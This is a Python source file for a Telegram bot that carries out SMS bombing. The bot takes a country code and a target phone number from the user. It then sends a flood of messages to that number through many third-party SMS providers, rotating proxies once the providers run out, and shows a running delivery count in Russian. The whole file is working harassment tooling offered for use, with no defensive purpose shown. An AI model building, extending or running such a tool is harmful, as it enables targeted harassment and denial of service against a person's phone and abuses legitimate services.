import json
import time
import random
import threading
import os
import Utils
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    Updater,
    CommandHandler,
    CallbackQueryHandler,
    ConversationHandler,
    CallbackContext,
    MessageHandler,
    Filters,
)
import Constants

# stages for first step
INPUT_CC, INPUT_TARGET, SELECTING_METHOD, START_BOMBING = range(4)

# callback data for sms bombing modes
DEFAULT, MEDIUM, HARD, STOP, DONE, RESET = range(4, 10)  # add state REPEAT

stop_buttons = [[InlineKeyboardButton(text='Stop', callback_data=str(STOP))]]
stop_keyboard = InlineKeyboardMarkup(stop_buttons)


def clear(context: CallbackContext, flag):
    context.user_data["stop_thread"] = flag
    if 'cc' in context.user_data:
        del context.user_data['cc']
    if 'target' in context.user_data:
        del context.user_data['target']
    if 'count' in context.user_data:
        del context.user_data['count']
    if 'time' in context.user_data:
        del context.user_data['time']


def start_count_bombing(cc, target, update: Update, context: CallbackContext, count=100):
    success, fail = 0, 0
    providers = Utils.get_services()
    proxies = Utils.get_proxies()
    use_proxy = False
    rand_proxy = None

    while success < count:
        try:
            rand_key = random.choice(list(providers))
        except IndexError:
            providers = Utils.get_services()
            rand_key = random.choice(list(providers))
            use_proxy = True
            rand_ip = random.choice(tuple(proxies))
            rand_proxy = {"http": rand_ip, "https": rand_ip}
            proxies -= {rand_ip}

        config = providers[rand_key]
        del providers[rand_key]
        if use_proxy:
            res = Utils.send_sms(config, cc, target, rand_proxy)
        else:
            res = Utils.send_sms(config, cc, target)

        if res:
            success += 1
            text = Constants.BOMBING_MODE + '\nДоставлено: %d/%d sms' % (success, count)
            update.callback_query.edit_message_text(text=text, reply_markup=stop_keyboard)
        else:
            fail += 1
            if context.user_data["stop_thread"]:
                return
        delay = 1
        time.sleep(delay)
    update.callback_query.edit_message_text(text=Constants.DONE_MESSAGE)
    return DONE


def start(update: Update, context: CallbackContext) -> None:
    clear(context, False)
    update.message.reply_text(text=Constants.STARTING_MESSAGE)
    return INPUT_CC


def input_cc(update: Update, context: CallbackContext) -> None:  # check if cc exists
    context.user_data["stop_thread"] = False
    country_code = json.load(open('isdcodes.json', 'r')).get('isdcodes')
    ccode = update.message.text
    if not country_code.get(ccode):
        update.message.reply_text(Constants.CC_FORMAT_ERROR)
        return INPUT_CC
    else:
        context.user_data['cc'] = ccode
        update.message.reply_text(Constants.ENTER_NUMBER)
        return INPUT_TARGET


def input_target(update: Update, context: CallbackContext) -> None:
    target = update.message.text
    if (len(target) <= 6) or (len(target) >= 12):
        update.message.reply_text('Wrong phone number, please enter correct one')
        return INPUT_TARGET
    else:
        context.user_data['target'] = target
        buttons = [
            [InlineKeyboardButton(text='DEFAULT', callback_data=str(DEFAULT))],
            [InlineKeyboardButton(text='MEDIUM', callback_data=str(MEDIUM))],
            [InlineKeyboardButton(text='HARD', callback_data=str(HARD))],
        ]
        keyboard = InlineKeyboardMarkup(buttons)
        update.message.reply_text(text=Constants.PROVIDING_METHODS, reply_markup=keyboard)
        return START_BOMBING


def select_mode(update: Update, context: CallbackContext) -> None:
    callback_data = update.callback_query.data
    if callback_data == str(DEFAULT):
        threading.Thread(target=start_count_bombing,
                         args=(context.user_data['cc'], context.user_data['target'], update, context)).start()
        text = Constants.BOMBING_MODE + '\nДоставлено: 0/50 sms'
        update.callback_query.answer()
        update.callback_query.edit_message_text(text=text,
                                                reply_markup=stop_keyboard)
        return STOP


def stopped(update: Update, context: CallbackContext) -> None:
    context.user_data["stop_thread"] = True
    update.callback_query.edit_message_text(text=Constants.STOP_MESSAGE)
    return DONE


def show_help(update: Update, context: CallbackContext) -> None:
    update.message.reply_text(Constants.HELP_MESSAGE)


def reset(update: Update, context: CallbackContext) -> None:
    clear(context, True)
    update.message.reply_text(Constants.RESET_MESSAGE)
    return INPUT_CC


def reset_nested(update: Update, context: CallbackContext) -> None:
    clear(context, True)
    update.message.reply_text(Constants.RESET_MESSAGE)
    return RESET


def main():
    update = Updater(os.environ['TOKEN'], use_context=True)
    dispatcher = update.dispatcher

    dispatcher.add_handler(CommandHandler('help', show_help))

    bombing_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(select_mode,
                                           pattern='^' + str(DEFAULT) + '$|^' + str(MEDIUM) + '$|^' + str(HARD) + '$')],
        states={
            STOP: [CallbackQueryHandler(stopped, pattern='^' + str(STOP) + '$')],
        },
        fallbacks=[CommandHandler('reset', reset_nested)],
        map_to_parent={
            DONE: ConversationHandler.END,
            RESET: INPUT_CC
        },
    )

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            INPUT_CC: [MessageHandler(Filters.regex('^[0-9]+$'), input_cc)],
            INPUT_TARGET: [MessageHandler(Filters.regex('^[0-9]+$'), input_target)],
            START_BOMBING: [bombing_handler]
        },
        fallbacks=[CommandHandler('reset', reset)]
    )

    dispatcher.add_handler(conv_handler)

    update.start_polling()
    update.idle()


if __name__ == '__main__':
    main()


